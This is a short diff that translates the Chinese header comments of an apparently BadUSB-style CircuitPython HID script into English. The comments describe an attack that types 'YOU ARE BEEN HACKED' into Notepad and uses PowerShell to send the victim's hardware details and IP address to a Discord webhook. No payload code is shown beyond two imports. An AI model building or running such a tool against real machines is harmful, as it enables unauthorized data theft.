@@ -1,9 +1,9 @@
-# 作用:
-# 縮小所有視窗，開啟記事本並打上"YOU ARE BEEN HACKED"
-# 然後透過powershell利用discord webhook傳送電腦硬體資訊/IP地址
-# 最後關閉所有powershell視窗
-# !!注意!! 這個腳本在開啟powershell之前會自動切換另一個語言的輸入法，所以如果你有多個輸入法的話可能會出錯
-#記得在第65行放入自己的webhook url
+# Purpose:
+# Minimize all windows, open Notepad, and type "YOU ARE BEEN HACKED"
+# Then, use PowerShell to send computer hardware information/IP address via Discord webhook
+# Finally, close all PowerShell windows
+# !! Note !! This script will automatically switch to another language input method before opening PowerShell, so if you have multiple input methods, it may cause errors.
+# Remember to put your own webhook URL in line 65.
 
 import time
 import usb_hid
